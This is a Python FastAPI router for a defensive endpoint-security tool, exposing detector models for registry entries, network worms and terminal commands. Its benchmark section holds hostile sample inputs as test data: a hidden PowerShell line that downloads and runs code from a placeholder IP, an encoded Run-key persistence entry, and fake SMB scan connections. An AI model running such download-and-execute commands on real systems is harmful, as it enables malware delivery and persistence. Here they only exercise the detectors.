"""API of the AI modules and their shared status.   Mounted at /api/ai   (see server.py)

    GET  /api/ai/status          every model: file, size, source (shipped / synced), latency, last error + the training report
    POST /api/ai/sentinel        registry entries  -> Random Forest + XGBoost verdicts
    POST /api/ai/netshield       connection list   -> graph neural network verdict + recommended response (worms, scanners)
    POST /api/ai/command/scan    new terminal commands -> verdict per command + recommended response
    GET  /api/ai/command/recent  the commands judged lately
    POST /api/ai/benchmark       time every model (the sub-200 ms promise) and return the numbers
    POST /api/ai/reset           delete synced models, back to the ones shipped with the app

Everything a module finds that is not "ok" is also written to the local SQLite database (store.py).
"""
from __future__ import annotations  # lets type hints refer to classes that are defined later

import json  # reads the training report
import time  # measures how long a model takes

import numpy as np  # numbers for the benchmark
from fastapi import APIRouter, Header  # the web framework
from pydantic import BaseModel, Field  # describes and checks the request bodies

import accounts  # audit log
import aimodel  # the script classifier
import ai_common  # shared model helpers
import cmdguard  # judges terminal commands
import netshield  # worm / scanner detector (graph neural network)
import pemodel  # PE malware model (weights in HDF5)
import sentinel  # registry judge (Random Forest + XGBoost)
import store  # the SQLite database of findings

router = APIRouter(prefix="/api/ai", tags=["ai"])  # every route below starts with /api/ai

_last: dict = {"netshield": None}  # the newest Net-Shield reading, for the status page


class SentinelItem(BaseModel):  # one registry entry to judge
    key: str = ""  # the registry key path
    value: str = ""  # the value name
    data: str = Field(default="", max_length=6000)  # the value data (what it runs)
    unsigned_writer: bool = False  # the program that wrote it is unsigned
    file_missing: bool = False  # the file it points to does not exist
    no_owner: bool = False  # the key has no known owner
    burst: int = 0  # how many entries changed at the same time
    new_entry: bool = False  # it appeared just now


class SentinelIn(BaseModel):  # the request body of /sentinel
    items: list[SentinelItem] = Field(default_factory=list, max_length=200)  # at most 200 entries per call


class Conn(BaseModel):  # one network connection
    local: str = ""  # local address:port
    remote: str = ""  # remote address:port
    state: str = ""  # ESTABLISHED, SYN_SENT, ...
    pid: int = 0  # process id
    process: str = ""  # process name
    new: bool = False  # opened during the last minute


class NetIn(BaseModel):  # the request body of /netshield
    connections: list[Conn] = Field(default_factory=list, max_length=5000)  # the connection table
    listening: list[int] = Field(default_factory=list, max_length=2000)  # ports this PC listens on


class CmdItem(BaseModel):  # one terminal command
    pid: int = 0  # process id
    name: str = ""  # program name
    parent: str = ""  # the program that started it
    exe: str = ""  # path of the program
    cmd: str = Field(default="", max_length=8000)  # the full command line


class CmdIn(BaseModel):  # the request body of /command/scan
    items: list[CmdItem] = Field(default_factory=list, max_length=200)  # at most 200 commands per call


def _sev(verdict: str) -> str:
    """Turns a verdict word into a severity word for the database."""
    if verdict == "ok":  # nothing wrong
        return "info"
    return {"malicious": "critical", "worm": "critical", "suspicious": "medium"}.get(verdict, "info")  # unknown words are only informational


@router.get("/status")
def api_status():
    """Status of every model, for the Settings page."""
    train = {}  # the script model's training report
    try:
        train = json.loads(aimodel.model_file().with_name("train_info.json").read_text(encoding="utf-8"))  # read the report next to the model
    except (OSError, ValueError):  # missing or broken file
        pass  # an empty report is fine
    pe_dir = ai_common.SYNCED_DIR if (ai_common.SYNCED_DIR / pemodel.MODEL_FILE).exists() else ai_common.BUNDLED_DIR  # a synced PE model wins over the shipped one
    return {
        "runtime": {"onnxruntime": ai_common.available(), "version": getattr(ai_common.ort, "__version__", None), "latency_budget_ms": ai_common.LATENCY_BUDGET_MS},  # is onnxruntime there
        "sentinel": sentinel.status(),  # registry judge
        "netshield": netshield.status(),  # worm detector
        "command_guard": cmdguard.status(),  # command judge
        "pe_model": pemodel.status(pe_dir),  # PE malware model
        "script_model": {"file": aimodel.model_file().name, "source": "synced" if aimodel.model_file() == aimodel.SYNCED_MODEL else "shipped", "report": train},  # script classifier
        "training_reports": ai_common.read_manifest(),  # training reports of the ONNX models
        "last_netshield": _last["netshield"],  # newest worm reading
        "store": store.stats(),  # database counters
    }


@router.post("/command/scan")
def api_command_scan(b: CmdIn):
    """New command lines from the agent -> a verdict per command + the response to recommend (kill_process)."""
    res = cmdguard.scan([i.model_dump() for i in b.items])  # judge every command
    for r in res["results"]:  # keep what looks wrong
        if r["verdict"] != "ok":
            store.add_finding("command", "high" if r["verdict"] == "malicious" else "medium", f"{r['name']}: {r['cmd'][:200]}", r["verdict"], r["score"], r)  # write to the database
    return res


@router.get("/command/recent")
def api_command_recent():
    """The commands judged lately."""
    return {"commands": cmdguard.recent(), "status": cmdguard.status()}


@router.post("/sentinel")
def api_sentinel(b: SentinelIn):
    """Judge registry entries with the Random Forest and XGBoost models."""
    items = [i.model_dump() for i in b.items]  # plain dictionaries
    res = sentinel.predict_batch(items)  # one verdict per entry
    if res is None:  # the models could not run
        return {"available": False, "results": []}
    for it, r in zip(items, res):  # pair every entry with its verdict
        if r["label"] == "malicious":  # keep the bad ones
            store.add_finding("sentinel", "high" if r["prob"] >= 0.85 else "medium", it["key"], "malicious", r["prob"], {"data": it["data"][:300], **r})
    return {"available": True, "results": [{"key": i["key"], **r} for i, r in zip(items, res)]}


@router.post("/netshield")
def api_netshield(b: NetIn):
    """Judge the connection table with the graph neural network (worms, scanners)."""
    res = netshield.analyze([c.model_dump() for c in b.connections], b.listening)  # build the graph and judge it
    _last["netshield"] = {"at": time.time(), "verdict": res["verdict"], "score": res["score"], "graph": res["graph"], "reasons": res["reasons"], "error": res["error"]}  # remember it
    if res["verdict"] != "ok":  # keep the bad readings
        who = "; ".join(n["name"] for n in res["nodes"][:3]) or "traffic graph"  # the programs involved
        res["finding_id"] = store.add_finding("netshield", _sev(res["verdict"]), who, res["verdict"], res["score"], {"reasons": res["reasons"], "nodes": res["nodes"], "graph": res["graph"]})
    return res


@router.post("/benchmark")
def api_benchmark():
    """Time each model on realistic input. The promise is under 200 ms; the numbers are measured here, on this PC."""
    out: dict = {"budget_ms": ai_common.LATENCY_BUDGET_MS, "models": {}}  # the answer
    if not ai_common.available():  # no onnxruntime, nothing to time
        return {**out, "error": "onnxruntime is not installed"}

    def timed(fn, n=15):
        """Runs fn once to warm up, then n times, and returns the median and the 95th percentile in milliseconds."""
        try:
            fn()  # warm-up run
            t = []  # the timings
            for _ in range(n):
                t0 = time.perf_counter()  # start
                fn()  # the call being timed
                t.append((time.perf_counter() - t0) * 1000)  # milliseconds
            return {"median_ms": round(float(np.median(t)), 2), "p95_ms": round(float(np.percentile(t, 95)), 2)}
        except Exception as e:  # a model that fails is reported, not hidden
            return {"error": f"{type(e).__name__}: {e}"}

    conns = [{"local": "192.168.1.5:50000", "remote": f"10.0.0.{i}:445", "state": "SYN_SENT", "pid": 4, "process": "System", "new": True} for i in range(1, 40)]  # 39 worm-like connections
    out["models"]["netshield_gnn (39 connections)"] = timed(lambda: netshield.analyze(conns, [445]))
    item = {"key": r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run\x", "data": "powershell -nop -w hidden -enc " + "QQBB" * 30}  # a suspicious Run entry
    out["models"]["sentinel RF + XGBoost (1 entry)"] = timed(lambda: sentinel.predict_batch([item]))
    out["models"]["sentinel RF + XGBoost (100 entries)"] = timed(lambda: sentinel.predict_batch([item] * 100))
    out["models"]["script classifier (numpy int8)"] = timed(lambda: aimodel.classify("powershell -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://1.2.3.4/a')"))
    out["all_within_budget"] = all(v.get("median_ms", 1e9) < ai_common.LATENCY_BUDGET_MS for v in out["models"].values())  # true when every model is fast enough
    return out


@router.post("/reset")
def api_reset(x_token: str = Header(default="")):
    """Delete the models that Git sync delivered, so the shipped ones are used again."""
    accounts.audit(x_token, "AI_MODELS_RESET")  # write who did it to the audit log
    return {"removed": ai_common.remove_synced()}
